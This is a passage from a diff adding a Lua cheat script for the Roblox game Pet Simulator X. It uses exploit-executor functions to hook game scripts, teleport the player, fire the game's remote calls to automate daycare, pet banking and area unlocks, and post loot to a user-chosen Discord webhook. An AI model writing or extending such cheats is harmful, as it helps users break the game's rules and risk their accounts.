+	local OpenEggsScript = getsenv(LocalPlayer.PlayerScripts.Scripts.Game:WaitForChild("Open Eggs", 10))
+	
+	function SkipEggAnimation()
+		if not Original_OpenEgg then
+			Original_OpenEgg = OpenEggsScript.OpenEgg
+		end
+		
+		OpenEggsScript.OpenEgg = function()
+			return true
+		end
+	end
+
+	function RestoreEggAnimation()
+		if not Original_OpenEgg then return end
+		OpenEggsScript.OpenEgg = Original_OpenEgg
+	end
+	
+	function UpdateEggInfo()
+		local playerData = Library.Save.Get()
+		local playerEggsOpened = playerData["EggsOpened"]
+		local serverBoosts = Library.ServerBoosts.GetActiveBoosts()
+		
+		if eggInfo then
+			local selectedEgg = LastOpenEggId or "None" 			
+			local selectedSetting = LastHatchSetting or "Normal"
+			local eggsOpened = Library.Functions.Commas(playerEggsOpened and playerEggsOpened[LastOpenEggId] and playerEggsOpened[LastOpenEggId] or 0)
+			local eggsRemaining = Library.Functions.Commas(Library.Directory.Eggs[selectedEgg] and math.floor(playerData[Library.Directory.Eggs[selectedEgg].currency] / Library.Directory.Eggs[selectedEgg].cost) > 0 and math.floor(playerData[Library.Directory.Eggs[selectedEgg].currency] / Library.Directory.Eggs[selectedEgg].cost) or 0)
+			local insaneLucky = serverBoosts and serverBoosts["Insane Luck"] and tostring(serverBoosts["Insane Luck"].totalTimeLeft) .. "s" or "Inactive" 
+			eggInfo:Set({Title = "Information", Content = string.format("Buy some egg in-game and it will be automatically selected!\n\n<b>Selected Egg:</b> %s\n<b>Mode:</b> %s\n<b>Quantity Hatched:</b> %s\n<b>Quantity Remaining:</b> %s\n<b>25x Insane Luck:</b> %s", selectedEgg, selectedSetting, eggsOpened, eggsRemaining, insaneLucky)})
+		end
+	end	
+	
+	task.spawn(function() 
+		while true do 
+			UpdateEggInfo()
+			task.wait()
+		end
+	end)
+	
+	local automationTab = Window:CreateTab("Automation", "13075622619", true)
+		
+	local automaticFunctionsSection = automationTab:CreateSection("Automatic Functions", false)
+	local enableAutoDaycare = false
+	local autodaycareButton = automationTab:CreateToggle({
+		Name = "Auto Daycare",
+		CurrentValue = false,
+		Flag = "Automation_AutoDaycare",
+		SectionParent = automaticFunctionsSection,
+		Callback = function(Value) 
+			enableAutoDaycare = Value
+			
+			if Value then 
+				CreateReminder()
+			end
+		end
+	})
+	
+	local Automations_AutoGameComplete = false
+	local autoCompleteGameToggle = automationTab:CreateToggle({
+		Name = "Auto Complete Game",
+		Flag = "Automation_AutoCompleteGame",
+		CurrentValue = false,
+		SectionParent = automaticFunctionsSection,
+		Callback = function(Value) 
+			
+			if Value then 
+				local currentAreaName, nextAreaName = GetCurrentAndNextArea()
+				if nextAreaName ~= "COMPLETED" then 
+					local areaToTeleport = Library.Directory.Areas[currentAreaName]
+					if areaToTeleport and areaToTeleport.world then
+						if Library.WorldCmds.Get() ~= areaToTeleport.world then 
+							Library.WorldCmds.Load(areaToTeleport.world)
+						end
+						wait(0.25)
+			
+						local areaTeleport = Library.WorldCmds.GetMap().Teleports:FindFirstChild(currentAreaName)
+						if areaTeleport then 
+							Library.Signal.Fire("Teleporting")
+							task.wait(0.25)
+							Character:PivotTo(areaTeleport.CFrame + areaTeleport.CFrame.UpVector * (Humanoid.HipHeight + HumanoidRootPart.Size.Y / 2))
+							Library.Network.Fire("Performed Teleport", currentAreaName)
+							task.wait(0.25)
+						end	
+					end
+				else
+					Value = false
+					Rayfield.Flags["Automation_AutoCompleteGame"]:Set(false)
+				end
+			-- CHECK FOR CURRENT AREA AND TELEPORT TO IT
+			end
+			
+			Automations_AutoGameComplete = Value
+			
+		end
+	})
+	local _, nextAreaCheck = GetCurrentAndNextArea() 
+	if nextAreaCheck == "COMPLETED" then 
+		autoCompleteGameToggle:Lock("No areas to unlock! 🎉", true)
+	end
+
+	local bankIndexSection = automationTab:CreateSection("Bank Index", false, false, "13080063246")
+	automationTab:CreateParagraph({ Title = "What is this?", Content = "Some people <font color=\"#2B699F\">store pets in a bank to complete the pet collection</font> on alt accounts.\n<b>This feature should help on that process, it will automatically do:</b>\n- <font color=\"#2B699F\"><b>Check non-indexed pets on current account</b></font>\n- <font color=\"#2B699F\"><b>Take pets from the bank</b></font>\n- <font color=\"#2B699F\"><b>Put back on the bank after indexed</b></font>" }, bankIndexSection)
+	
+	local BankIndex_Debounce = false
+	local BankIndex_InProgress = false
+	local BankIndex_OwnerUsername = ""
+	
+	local Input = automationTab:CreateInput({
+	   Name = "Bank Owner",
+	   Info = "Owner of the bank", -- Speaks for itself, Remove if none.
+	   PlaceholderText = "CoolUsername69",
+	   Flag = "BankIndex_OwnerUsername",
+	   SectionParent = bankIndexSection,
+	   OnEnter = false, -- Will callback only if the user pressed ENTER while the box is focused.
+	   RemoveTextAfterFocusLost = false,
+	   Callback = function(Text)
+			BankIndex_OwnerUsername = Text
+	   end,
+	})
+	
+	local bankIndexInfo = automationTab:CreateParagraph({
+			Title = "Idling",
+			Content = "Not doing anything yet..."
+		}, bankIndexSection)
+	
+	local startBankIndex = nil
+	
+	function BankMessage(message)
+		if not startBankIndex then return end
+		coroutine.wrap(function() 
+			while true do
+				wait()
+				startBankIndex:Set(nil, message)
+				break
+			end
+		end)()
+	end
+			
+	function BankError(errorMessage)
+		pcall(function() 
+			bankIndexInfo:Set({
+				Title = "Idling",
+				Content = "Not doing anything yet..."
+			})
+		end)
+		BankMessage(errorMessage)
+		print("Error on Bank Index: " .. errorMessage)
+		wait(3)
+		BankMessage("")
+	end
+
+	startBankIndex = automationTab:CreateButton({
+		Name = "Start Indexing",
+		CurrentValue = false,
+		Interact = "",
+		SectionParent = bankIndexSection,
+		Callback = function(Value)
+
+			if BankIndex_Debounce then return end
+			
+			if not BankIndex_InProgress then
+				BankIndex_Debounce = true
+				coroutine.wrap(function() 
+					wait(0.3)
+					BankIndex_Debounce = false
+				end)()
+			end
+			
+			-- Start bank functions
+			if BankIndex_InProgress then 
+				-- Cancel process
+				BankIndex_Debounce = true
+				BankIndex_InProgress = false
+				BankMessage(nil, "")
+				coroutine.wrap(function() 
+					while true do
+						wait()
+						startBankIndex:Set("Waiting deposit to stop...", nil)
+						break
+					end
+				end)()
+			else
+				-- Start process
+				local SaveData = Library.Save.Get()
+				if not SaveData or not SaveData.Collection then 
+					BankError("Failed to get data!")
+					return
+				end
+				
+				if Library.WorldCmds.Get() ~= "Spawn" then
+					if not Library.WorldCmds.Load("Spawn") then return end
+					wait(1)
+				end
+
+				HumanoidRootPart.CFrame = Library.WorldCmds.GetMap().Interactive.Bank.Pad.CFrame + Vector3.new(0, 3, 0) 
+				HumanoidRootPart.CFrame = HumanoidRootPart.CFrame + (HumanoidRootPart.CFrame.LookVector * 15)
+				
+				wait(0.5)
+				
+				local BankUID = nil
+
+				BankMessage(nil, "Getting UserID")
+				local success, result = pcall(function() return Players:GetUserIdFromNameAsync(BankIndex_OwnerUsername) end)
+				if not success then 
+					BankError("User not found!")
+					print(result)
+					return
+				end
+				
+				ownerId = result
+				if not ownerId or not tonumber(ownerId) then
+					BankError("Can't get UserID")
+					return
+				end
+				
+				local myBanks = Library.Network.Invoke("Get My Banks")
+				if not myBanks then 
+					BankError("Bank is on cooldown!")
+					return 
+				end 
+				
+				for _, bank in pairs(myBanks) do 
+					if bank.Owner == tonumber(ownerId) then 
+						BankUID = bank.BUID
+						break
+					end
+				end 
+				
+
+				if not BankUID then BankError("Bank was not found!") return end
+				
+				-- Get missing collection pets
+				local allCollectablePets = Library.Shared.GetAllCollectablePets()
+				local remainingPets = {}
+				
+				for i, pet in pairs(allCollectablePets) do 
+					local petId = pet.petId
+					local isGolden = pet.isGolden
+					local isRainbow = pet.isRainbow
+					local isDarkMatter = pet.isDarkMatter
+					
+					local petType = 1
+					if isGolden then
+						petType = 2
+					elseif isRainbow then
+						petType = 3
+					elseif isDarkMatter then
+						petType = 4
+					end
+								
+					local isUnlocked = Library.Functions.SearchArray(SaveData.Collection, tostring(petId) .. "-" .. tostring(petType))
+					if not isUnlocked then
+						remainingPets[petId] = true
+					end
+				end
+				
+				
+				local Bank = Library.Network.Invoke("Get Bank", BankUID) 
+				if not Bank then BankError("Bank was not found!") return end
+
+				local BankPets = Bank.Storage.Pets
+
+				
+				local petsAvailableOnBank = {}
+				for _, pet in pairs(BankPets) do 
+					local petId = pet.id
+					local isGolden = pet.g
+					local isRainbow = pet.r
+					local isDarkMatter = pet.dm
+					
+					local petType = 1
+					if isGolden then petType = 2
+					elseif isRainbow then petType = 3
+					elseif isDarkMatter then petType = 4 end
+					
+					local isUnlocked = Library.Functions.SearchArray(SaveData.Collection, tostring(petId) .. "-" .. tostring(petType))
+					
+					local petData = Library.Directory.Pets[petId]
+					if petData and (petData.titanic or petData.huge or petData.rarity == "Exclusive" or petData.rarity == "Event") then petType = 5 end -- Huges/Exclusives/Event don't need to be indexed more than 1 time
+					
+					local petIdentifer = tostring(petId) .. "-" .. tostring(petType)
+					-- Pet is not unlocked and not on our table, put they on list!
+					if remainingPets[petId] and not petsAvailableOnBank[petIdentifer] and not isUnlocked then petsAvailableOnBank[petIdentifer] = pet end
+				end
+
+
+				local function UpdateInfo()
+					local petsAvailableOnBankCount = 0
+					for _, pet in pairs(petsAvailableOnBank) do
+						if pet then 
+							petsAvailableOnBankCount = petsAvailableOnBankCount + 1
+						end
+					end
+					
+					bankIndexInfo:SetContent(string.format("You have <b>%s</b> of %s unlockable pets\n", tostring(#SaveData.Collection), tostring(#allCollectablePets)) ..
+									  string.format("This bank have %s pets in total\n", tostring(#BankPets)) ..
+									  string.format("This bank have <b>%s</b> of %s pets that you need to complete your collection", tostring(petsAvailableOnBankCount), tostring(#allCollectablePets - #SaveData.Collection)))
+				
+				end
+				UpdateInfo()
+				
+				BankIndex_InProgress = true
+				
+				coroutine.wrap(function() 
+					while true do
+						wait()
+						startBankIndex:Set("Stop Indexing", nil)
+						break
+					end
+				end)()
+				
+				wait(1)
+	
+				coroutine.wrap(function()
+					local petsToWithdraw = {}
+					local failedToDeposit = false
+					while BankIndex_InProgress do
+					
+						UpdateInfo()
+						if not petsToWithdraw or #petsToWithdraw < 50 then
+							for petIdentifer, pet in pairs(petsAvailableOnBank) do 
+								if pet and pet.uid and #petsToWithdraw < 50 then
+									table.insert(petsToWithdraw, pet.uid)
+									petsAvailableOnBank[petIdentifer] = nil
+								end
+								
+								if #petsToWithdraw >= 50 then break end
+							end
+						end
+						
+						UpdateInfo()
+						if petsToWithdraw and #petsToWithdraw > 0 then
+							bankIndexInfo:SetTitle(string.format("Withdrawing %s pets...", tostring(#petsToWithdraw)))
+							wait(0.5)
+							
+							local oldCollectionCount = 0 + #SaveData.Collection
+							local expectedCollectionCount = oldCollectionCount + #petsToWithdraw
+							
+							local withdrawSuccess, withdrawMessage = Library.Network.Invoke("Bank Withdraw", BankUID, petsToWithdraw, 0)
+							if withdrawSuccess then
+								UpdateInfo()
+								bankIndexInfo:SetTitle(string.format("Waiting for %s pets to index...", tostring(#petsToWithdraw)))
+								wait(5)
+								
+								local cTick = tick()
+								repeat UpdateInfo() wait() until #SaveData.Collection > oldCollectionCount or not BankIndex_InProgress or tick() - cTick > 15
+								bankIndexInfo:SetTitle(string.format("Depositing %s pets...", tostring(#petsToWithdraw)))
+								
+								UpdateInfo()
+								local depositsAttempts = 0
+								
+								
+								local function TryToDeposit()
+									local depositSuccess, depositMessage = Library.Network.Invoke("Bank Deposit", BankUID, petsToWithdraw, 0)
+									if not depositSuccess then 
+										if depositsAttempts >= 5 then 
+											failedToDeposit = true 
+											return 
+										end
+										depositsAttempts = depositsAttempts + 1
+										wait(5)
+										TryToDeposit()
+									end
+								end
+								
+								TryToDeposit()
+								
+								if failedToDeposit then
+									bankIndexInfo:SetTitle("Oopps... Aborting process!")
+									bankIndexInfo:SetContent(string.format("Damn! <b>Failed to deposit</b> after <b>5</b> attempts, <font color=\"#FF0000\">process has been canceled</font>!\nFailed to deposit: %s pets!", tostring(#petsToWithdraw)))
+									break
+								else 
+									-- CLEAR THE WITHDRAW TABLE
+									petsToWithdraw = {}
+								end
+							else
+								print(withdrawMessage)
+							end
+						else break end
+						wait(10)
+					end
+					
+					BankIndex_InProgress = false
+					BankIndex_Debounce = false
+					UpdateInfo()
+					
+					coroutine.wrap(function() 
+						while true do
+							wait()
+							startBankIndex:Set("Start Indexing", nil)
+							break
+						end
+					end)()
+					
+					if not failedToDeposit then 
+						bankIndexInfo:Set({
+							Title = "Idling",
+							Content = "Not doing anything yet..."
+						})
+					end
+					
+					BankMessage(nil, "")
+				end)()
+			end
+		end
+	})
+	
+	local CompleteCollection_NormalEggs = true
+	local CompleteCollection_GoldenEggs = true
+	local CompleteCollection_MakeRainbows = false
+	local CompleteCollection_MakeDarkMatter = false
+	
+	function GetNextMissingPet()
+		local SaveData = Library.Save.Get()
+		if not SaveData then return nil end
+		
+		local allCollectablePets = Library.Shared.GetAllCollectablePets()
+		local remainingPets = {}
+
+		for i, pet in pairs(allCollectablePets) do 
+			local petId = pet.petId
+			local petData = Library.Directory.Pets[petId]
+			local isGolden = pet.isGolden
+			local isRainbow = pet.isRainbow
+			local isDarkMatter = pet.isDarkMatter
+			
+			local petType = 1
+			if isGolden then
+				petType = 2
+			elseif isRainbow then
+				petType = 3
+			elseif isDarkMatter then
+				petType = 4
+			end
+						
+					
+			local isUnlocked = Library.Functions.SearchArray(SaveData.Collection, tostring(petId) .. "-" .. tostring(petType))
+			if petData and not (petData.titanic or petData.huge or petData.rarity == "Exclusive" or petData.rarity == "Event") and not isUnlocked then
+				-- remainingPets[petId] = petType
+				table.insert(remainingPets, {petId, petType})
+			end
+		end
+		
+		table.sort(remainingPets, function(a, b)
+			local petDataA = Library.Directory.Pets[a[1]]
+			local petDataB = Library.Directory.Pets[b[1]]
+			
+			local petTypeA = a[2]
+			local petTypeB = b[2]
+			
+			if a == b then 
+				return petTypeA < petTypeB
+			end
+			
+			return a[1] < b[1]
+		end)
+		
+		for i, v in ipairs(remainingPets) do return v end
+	end
+	
+	function GetBestEggForPet(petId)
+		local allEggs = Library.Directory.Eggs
+		local eggsWithPet = {}
+		for eggId, v in pairs(allEggs) do
+			if v and v.drops and typeof(v.drops) == "table" then
+				for _, drop in pairs(v.drops) do
+					local petDropId = drop[1]
+					if petDropId == tostring(petId) then
+						table.insert(eggsWithPet, {eggId, drop[2]})
+					end
+				end
+			end
+		end
+		
+		table.sort(eggsWithPet, function(a, b) 
+			local chanceA = eggsWithPet[a][2]
+			local chanceB = eggsWithPet[b][2]
+			
+			return chanceA > chanceB
+		end)
+		
+		for i, v in ipairs(eggsWithPet) do
+			return v[1]
+		end
+		return nil
+	end
+	
+	local completeCollectionSection = automationTab:CreateSection("Auto Pet Collection", false, true)
+	local completeCollectionStatus = automationTab:CreateParagraph({Title = "Status", Content = "Waiting to start"}, completeCollectionSection)
+	
+	local completeCollectionNormalEggs = automationTab:CreateToggle({
+		Name = "Normal Eggs",
+		SectionParent = completeCollectionSection,
+		CurrentValue = true,
+		Flag = "CompleteCollection_NormalEggs",
+		Callback = function(value) 
+			CompleteCollection_NormalEggs = value
+			
+			coroutine.wrap(function()
+				local currentPet, currentPetType = unpack(GetNextMissingPet())
+				local currentEgg = GetBestEggForPet(currentPet)
+				completeCollectionStatus:SetContent("Pet: " .. Library.Directory.Pets[currentPet].name .. "\nType: " .. currentPetType .. "\nEgg: " .. currentEgg)
+				
+				
+				while task.wait(3) do
+				
+				end
+			end)()
+		end
+	})
+	
+	
+	local completeCollectionGolldenEggs = automationTab:CreateToggle({
+		Name = "Golden Eggs",
+		SectionParent = completeCollectionSection,
+		CurrentValue = true,
+		Flag = "CompleteCollection_GoldenEggs",
+		Callback = function(value) 
+			CompleteCollection_GoldenEggs = value
+		end
+	})
+
+	local completeCollectionMakeRainbows = automationTab:CreateToggle({
+		Name = "Make Rainbows",
+		SectionParent = completeCollectionSection,
+		CurrentValue = false,
+		Flag = "CompleteCollection_MakeRainbows",
+		Callback = function(value) 
+			CompleteCollection_MakeRainbows = value
+		end
+	})
+	
+	local completeCollectionMakeDarkMatter = automationTab:CreateToggle({
+		Name = "Make Dark Matter",
+		SectionParent = completeCollectionSection,
+		CurrentValue = false,
+		Flag = "CompleteCollection_MakeDarkMatter",
+		Callback = function(value) 
+			CompleteCollection_MakeDarkMatter = value
+		end
+	})
+	
+	
+	-- SETTINGS
+	local AUTODAYCARE_OTHER_GAMEMODES = false -- CHANGE THIS TO TRUE IF YOU WANT TO AUTO-COLLECT/ENROLL BOTH NORMAL AND HARDCORE GAMEMODES 
+	local TRY_TO_TELEPORT_SAME_SERVER = true -- If auto-daycare is enabled for both gamemodes, this option will TRY teleport you back to the same server that you were before
+
+
+
+	local DAYCARE_WORLD = "Spawn"
+	local DAYCARE_POSITION = Vector3.new(35, 110, 40)
+	local PetsToDaycare = {}
+
+	local DaycareGUI = Library.GUI.Daycare;
+
+	local DISCORD_EMOTES = {
+		["Diamonds"] = "<:e:1062469796341497887>",
+		["Triple Coins"] = "<:e:1082130777355079800>",
+		["Triple Damage"] = "<:e:1082130816261443674>",
+		["Super Lucky"] = "<:e:1082130793880621167>",
+		["Ultra Lucky"] = "<:e:1082130805914079313>"
+	}
+
+	local COIN_EMOTE = "<:e:1087199766401794168>"
+	local PET_EMOTE = "<:e:1083222082533462098>"
+
+	local AUTODAYCARE_SETTINGS_FOLDER = "AutoDaycare"
+	local AUTODAYCARE_SETTINGS_FILE = "SaveData"
+
+	function SaveSettings() 
+		pcall(function() 
+			if not isfolder(AUTODAYCARE_SETTINGS_FOLDER) then
+				makefolder(AUTODAYCARE_SETTINGS_FOLDER)
+			end
+			
+			local fileData = {}
+			
+			if CurrentWorld and CurrentWorld ~= "" then 
+				fileData.World = CurrentWorld
+			end
+			
+			if CurrentPosition and CurrentPosition ~= nil then 
+				fileData.Position = CurrentPosition
+			end
+			
+			fileData.GameMode = "normal"
+			if Library.Shared.IsHardcore then 
+				fileData.GameMode = "hardcore"
+			end
+			
+			writefile(AUTODAYCARE_SETTINGS_FOLDER .. "/" .. AUTODAYCARE_SETTINGS_FILE .. ".json", tostring(HttpService:JSONEncode(fileData)))
+		end)
+	end
+
+	local IsTeleporting = false
+	function LoadSettings() 
+		pcall(function()
+			if isfile(AUTODAYCARE_SETTINGS_FOLDER .. "/" .. AUTODAYCARE_SETTINGS_FILE .. ".json") then
+				local saveData = readfile(AUTODAYCARE_SETTINGS_FOLDER .. "/" .. AUTODAYCARE_SETTINGS_FILE .. ".json")
+				local save = HttpService:JSONDecode(saveData)
+				
+				if not save.GameMode or save.GameMode == "" then return end
+				
+				local shouldTeleport = false
+				if save.World and save.World ~= "" then
+					CurrentWorld = save.World
+					shouldTeleport = true
+				end
+				
+				if save.Position and save.Position ~= nil then
+					CurrentPosition = save.Position
+					shouldTeleport = true
+				end
+				
+				local gamemode = "normal"
+				if Library.Shared.IsHardcore then 
+					gamemode = "hardcore"
+				end
+				
+				if save.GameMode ~= gamemode then return end
+				
+				if shouldTeleport then 
+					IsTeleporting = true
+					TeleportBack()
+					IsTeleporting = false
+				end
+			end
+		end)
+	end
+
+	function SendWebhookInfo(quantity, loots)
+		if not Webhook_Enabled or not Webhook_Daycare or not Webhook_URL or Webhook_URL == "" then return end
+
+		local gamemode = "[NORMAL]"
+		if Library.Shared.IsHardcore then 
+			gamemode = "[HARDCORE]"
+		end
+		
+		local lootString = ""
+		
+		local ContainsPet = false
+		for _, loot in pairs(loots) do 
+			local selectedEmote = ""
+			if DISCORD_EMOTES[loot.Data] then 
+				selectedEmote = DISCORD_EMOTES[loot.Data]
+			elseif loot.Category == "Currency" then
+				selectedEmote = COIN_EMOTE
+			elseif loot.Category == "Pet" then
+				ContainsPet = true
+				selectedEmote = PET_EMOTE
+			end
+			
+			lootString = lootString .. selectedEmote .. " " .. Library.Functions.NumberShorten(loot.Min) .. " **" .. loot.Data .. "**\n" 
+		end
+
+		local embed = {
+				["title"] = "Daycare has been collected! " .. gamemode,
+				["description"] = "Successfully collected **".. tostring(quantity) .."** pets from daycare!",
+				["color"] = tonumber(0x90ff90),
+
+				["fields"] = {
+					{
+						["name"] = "Collected Loot",
+						["value"] = lootString,
+						["inline"] = false
+					}
+				},
+				["footer"] = {
+					["text"] = "Pet Simulator X",
+					["icon_url"] = "https://i.imgur.com/pWIzvzD.png"
+				}
+			}
+			
+		(syn and syn.request or http_request or http.request) {
+			Url = Webhook_URL;
+			Method = 'POST';
+			Headers = {
+				['Content-Type'] = 'application/json';
+			};
+			Body = HttpService:JSONEncode({
+				username = "Daycare Update", 
+				avatar_url = 'https://i.imgur.com/pWIzvzD.png',
+				embeds = {embed} 
+			})
+		}
+	end
+
+
+	function TeleportToDaycare()
+		CurrentWorld = Library.WorldCmds.Get()
+		
+		
+		CurrentPosition = HumanoidRootPart.CFrame
+		task.wait()
+		
+		-- Go to Spawn World
+		if CurrentWorld ~= DAYCARE_WORLD then
+			Library.WorldCmds.Load(DAYCARE_WORLD)
+		end
+
+		HumanoidRootPart.CFrame = CFrame.new(DAYCARE_POSITION) 
+	end
+
+	function SendNotification(msg, options)
+		if not options then
+			options = {
+				time = 10,
+				color = Color3.fromRGB(160, 30, 245),
+				force = true
+			}
+		end
+
+		Library.Signal.Fire("Notification", msg, options)
+	end
+
+	function ErrorNotification(msg) 
+		SendNotification(msg, {
+			time = 10, color = Color3.fromRGB(255, 60, 60), force = true
+		})
+	end
+
+	local BoostIcons = {
+		["Triple Coins"] = "rbxassetid://7402604552", 
+		["Triple Damage"] = "rbxassetid://7402604431", 
+		["Super Lucky"] = "rbxassetid://7402604677", 
+		["Ultra Lucky"] = "rbxassetid://7402706511"
+	}
+
+	function CollectDaycare()
+		local saving = Library.Save.Get()
+		if not saving then 
+			ErrorNotification("Something went wrong! Try re-logging!")
+			return
+		end
+		
+		local success, errorMsg, pets, loots, queue = Library.Network.Invoke("Daycare: Claim", nil)
+		if not success then
+			return false, (errorMsg and "Can't claim, unknown error!")
+		end
+
+		if loots then 
+			
+			for _, loot in pairs(loots) do
+				-- print (tostring(loot.Category) .. ": " .. tostring(loot.Min) .. "x " .. tostring(loot.Data) )
+				-- Quantity: loot.Min
+				if loot.Category == "Currency" then 
+					-- CurrencyIcon: Library.Directory.Currency[loot.Data].tinyImage;	
+				elseif loot.Category == "Boost" then
+					-- BoostIcon = BoostIcon[loot.Data]
+				elseif loot.Category == "Pet" then
+					local petData = loot.Data;
+					
+					-- Open Huge Egg
+					if petData.id ~= "1019" then
+						Library.Signal.Fire("Open Egg", "Huge Machine Egg 1", { petData });
+					end
+				end
+			end
+			
+		end
+		
+		if queue then
+			if Library.Shared.IsHardcore then
+				saving.DaycareHardcoreQueue = queue;
+			else
+				saving.DaycareQueue = queue;
+			end
+			
+			-- Remove pets that isn't ready yet
+			
+			for _, pet in pairs(queue) do
+				if pet["Pet"] and pet["Pet"].uid then
+					local tablePos = table.find(PetsToDaycare, pet["Pet"].uid)
+					if tablePos then
+						-- print("A pet was not ready yet!")
+						table.remove(PetsToDaycare, tablePos)
+					end
+				end
+			end
+			
+		end
+		
+		SendWebhookInfo(#PetsToDaycare, loots)
+
+		return true, nil
+	end
+
+	function PutPetsInDaycare()
+		local saving = Library.Save.Get()
+		local success, errorMsg, _ = Library.Network.Invoke("Daycare: Enroll", PetsToDaycare)
+		if not success then
+			return false, (errorMsg and "Can't enroll pets, unknown error!")
+		end
+
+		print(tostring(#PetsToDaycare) .. " pets have been put on daycare!")
+		task.wait(1)
+		
+		Library.Signal.Fire("Stat Changed", "DaycareTier")
+		Library.Signal.Fire("Window Closed", DaycareGUI.Gui)
+		return true, nil
+	end
+
+	function CreateReminder()
+		if getgenv().AutoDaycare then
+			return 
+		end
+		
+		local saving = Library.Save.Get()
+		
+		local queue = saving.DaycareQueue
+		if Library.Shared.IsHardcore then
+			queue = saving.DaycareHardcoreQueue
+		end
+		
+		-- Check if queue isn't nil and queue lenght is more than 1 (pet)
+		if queue ~= nil and #queue > 0 then	
+			getgenv().AutoDaycare = true
+			coroutine.wrap(function() 
+				while true do
+					local allPetsAreReady = true
+					
+					for _, pet in pairs(queue) do
+						local remainingTime = Library.Shared.DaycareComputeRemainingTime(saving, pet)
+
+						if remainingTime > 0 then
+							allPetsAreReady = false
+							break
+						end
+
+					end
+					
+					
+					if allPetsAreReady or not enableAutoDaycare then break end
+					task.wait(1)
+				end
+				
+				getgenv().AutoDaycare = false
+				
+				if not enableAutoDaycare then return end
+				if ScriptIsCurrentlyBusy then 
+					while ScriptIsCurrentlyBusy do wait() end
+					ScriptIsCurrentlyBusy = true
+					wait(3)
+				end
+				
+				ScriptIsCurrentlyBusy = true
+				
+				--if reminder then Library.Message.New("Your pets in daycare are ready to collect!") end
+				
+				PetsToDaycare = {}
+				
+				for _, pet in pairs(queue) do	
+					local remainingTime = Library.Shared.DaycareComputeRemainingTime(saving, pet)
+
+					if remainingTime <= 0 and pet["Pet"] and pet["Pet"].uid then
+						table.insert(PetsToDaycare, pet["Pet"].uid)
+					end
+				end
+				
+				TeleportToDaycare()
+				task.wait(1)
+				
+				local collected, collectError = CollectDaycare()
+				if not collected then		
+					ErrorNotification(collectError)
+					ResetDaycare()
+					return
+				end
+				
+				task.wait(3)
+				
+				local enrollSuccess, enrollError = PutPetsInDaycare()
+				if not enrollSuccess then
+					ErrorNotification(enrollError)
+					ResetDaycare()
+					return
+				end
+
+				SendNotification("Successfully put pets in daycare!")
+				ResetDaycare()
+			end)()
+		end
+	end
+
+	function TeleportBack()
+		pcall(function() 
+			-- Go to Spawn World
+			if CurrentWorld ~= "" and Library.WorldCmds.Get() ~= CurrentWorld then
+				Library.WorldCmds.Load(CurrentWorld)
+			end
+			CurrentWorld = ""
+			
+			if CurrentPosition then
+				HumanoidRootPart.CFrame = CurrentPosition
+			end
+			CurrentPosition = nil
+		end)
+	end
+
+	function ResetDaycare()
+		TeleportBack()
+		DaycareGUI.Categories.ViewPets.Frame.PetReady.Visible = false
+
+		-- FIRE CLOSE CONNECTION
+		for _, connection in pairs(getconnections(DaycareGUI.Close.Activated)) do 
+			connection:Fire()
+		end
+
+		wait(3)
+		ScriptIsCurrentlyBusy = false
+	end
+
+	Library.Signal.Fired("Stat Changed"):Connect(function(stat)
+		if stat == "DaycareQueue" and enableAutoDaycare then
+			CreateReminder()
+		end
+	end)
+
+	task.spawn(function() 
+		while true do
+			if Automations_AutoGameComplete then	
+				local saveData = Library.Save.Get()
+				local currentAreaName, nextAreaName = GetCurrentAndNextArea()
+				local currentArea = Library.Directory.Areas[currentAreaName]
+				local nextArea = Library.Directory.Areas[nextAreaName]
+				
+				local shouldSkip = false
+				if currentAreaName == "Hacker Portal" then
+					shouldSkip = true
+					local ownsHackerGate = IsHardcore and saveData.Hardcore.HackerPortalUnlocked or not IsHardcore and saveData.HackerPortalUnlocked
+					if not ownsHackerGate then
+					
+						local currentProgress, currentMission = unpack(IsHardcore and saveData.Hardcore.HackerPortalProgress or saveData.HackerPortalProgress)
+						if currentMission < 0 then
+							-- Start quest
+							local map = Library.WorldCmds.GetMap()
+							local interactive = nil
+							if map then interactive = map:FindFirstChild("Interactive") end
+							
+							local hackerPortal = nil
+							if interactive then hackerPortal = interactive:FindFirstChild("Hacker Portal") end
+							
+							local interactLocation = nil
+							if hackerPortal then interactLocation = hackerPortal:FindFirstChild("_INTERACT") end
+							
+							if interactLocation then
+								HumanoidRootPart.CFrame = CFrame.new(interactLocation.CFrame.p) + (interactLocation.CFrame.RightVector * 10)
+								SendNotification("Starting hacker portal mission...")
+								Library.Network.Fire("Start Hacker Portal Quests")
+								currentMission = 1
+							end
+						end
+						
+						if currentMission > 1 then
+							currentMission = 1
+							currentProgress = Library.Shared.HackerPortalQuests[1]
+
+						end
+						
+						if currentMission > -1 then
+							local totalToComplete = Library.Shared.HackerPortalQuests[currentMission]
+							if totalToComplete and tonumber(totalToComplete) and currentProgress >= totalToComplete then
+								local map = Library.WorldCmds.GetMap()
+								local interactive = nil
+								if map then interactive = map:FindFirstChild("Interactive") end
+								
+								local hackerPortal = nil
+								if interactive then hackerPortal = interactive:FindFirstChild("Hacker Portal") end
+								
+								local interactLocation = nil
+								if hackerPortal then interactLocation = hackerPortal:FindFirstChild("_INTERACT") end
+								
+								if interactLocation then
+									HumanoidRootPart.CFrame = CFrame.new(interactLocation.CFrame.p) + (interactLocation.CFrame.RightVector * 10)
+									wait(0.3)
+								end
+								
+								if Library.Network.Invoke("Finish Hacker Portal Quest")	then
+									SendNotification("Unlocking Void...")
+									Library.WorldCmds.Load("Void")
+									wait(2)
+									SendNotification("Unlocking ".. nextAreaName .. "...")
+									Library.WorldCmds.Load(nextArea.world)
+									wait(1)
+								end
+							end
+						end
+					else 
+						SendNotification("Unlocking Void...")
+						Library.WorldCmds.Load("Void")
+						wait(2)
+						SendNotification("Unlocking ".. nextAreaName .. "...")
+						Library.WorldCmds.Load(nextArea.world)
+						wait(1)
+					end
+				end
+				
+				if nextAreaName ~= "COMPLETED" and not shouldSkip and CheckIfCanAffordArea(nextAreaName) then 
+					-- Buy area
+					local currentWorld = Library.WorldCmds.Get() 
+					if currentWorld ~= nextArea.world then 
+						Library.WorldCmds.Load(nextArea.world)
+						wait(1)
+					end
+					
+					local map = Library.WorldCmds.GetMap()
+					local allGates = nil
+					if map then allGates = map:FindFirstChild("Gates") end
+					
+					local successfullyTeleported = false
+					if allGates and allGates:FindFirstChild(nextAreaName) then
+						local gate = allGates:FindFirstChild(nextAreaName):FindFirstChild("Gate")
+						if gate and gate:FindFirstChild("GateHUD") then
+							local gateTP = gate:FindFirstChild("GateHUD").Parent
+							if gateTP then 
+								HumanoidRootPart.CFrame = CFrame.new(gateTP.CFrame.p) * CFrame.new(1,0,0)
+								successfullyTeleported = true
+							end
+						end
